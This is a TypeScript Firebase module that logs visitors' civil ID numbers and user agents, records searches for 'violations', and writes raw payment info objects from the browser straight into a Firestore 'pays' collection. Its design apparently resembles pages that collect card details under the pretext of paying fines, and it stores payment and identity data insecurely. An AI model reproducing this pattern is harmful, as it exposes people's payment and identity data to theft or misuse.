import {
    collection,
    addDoc,
    serverTimestamp,
    setDoc,
    doc,
    getFirestore,
  } from "firebase/firestore";
  import { initializeApp } from "firebase/app";
  import { getDatabase } from "firebase/database";
  
  const firebaseConfig = {
    // Your Firebase configuration will be injected here
    apiKey: "AIzaSyAA1FtUW54Hp1F74uLdwKUPEe3_PVRFobU",
    authDomain: "zain-8fa09.firebaseapp.com",
    projectId: "zain-8fa09",
    storageBucket: "zain-8fa09.firebasestorage.app",
    messagingSenderId: "617837090662",
    appId: "1:617837090662:web:81421024d76054923c9aa7"  
    
  };
  
  const app = initializeApp(firebaseConfig);
  export const db = getFirestore(app);
  export const datatabas = getDatabase(app);
  
  interface VisitorData {
    civilId: string;
    timestamp: any;
    userAgent: string;
    violations?: any[];
  }
  
  export async function logVisitor(civilId: string): Promise<string> {
    try {
      const visitorRef = await addDoc(collection(db, "visitors"), {
        civilId,
        timestamp: serverTimestamp(),
        userAgent: navigator.userAgent,
      } as VisitorData);
  
      return visitorRef.id;
    } catch (error) {
      console.error("Error logging visitor:", error);
      throw error;
    }
  }
  
  export async function saveViolationSearch(
    civilId: string,
    violations: any[]
  ): Promise<string> {
    try {
      const searchRef = await addDoc(collection(db, "searches"), {
        civilId,
        violations,
        timestamp: serverTimestamp(),
      });
  
      return searchRef.id;
    } catch (error) {
      console.error("Error saving search:", error);
      throw error;
    }
  }
  export async function addData(data: any) {
    localStorage.setItem("visitor", data.id);
    try {
      const docRef = await doc(db, "pays", data.id!);
      await setDoc(
        docRef,
        { ...data, createdDate: new Date().toISOString() },
        { merge: true }
      );
  
      console.log("Document written with ID: ", docRef.id);
      // You might want to show a success message to the user here
    } catch (e) {
      console.error("Error adding document: ", e);
      // You might want to show an error message to the user here
    }
  }
  export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
    try {
      const visitorId = localStorage.getItem("visitor");
      if (visitorId) {
        const docRef = doc(db, "pays", visitorId);
        await setDoc(
          docRef,
          { ...paymentInfo, status: "pending" },
          { merge: true }
        );
        setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
      }
    } catch (error) {
      console.error("Error adding document: ", error);
      alert("Error adding payment info to Firestore");
    }
  };
  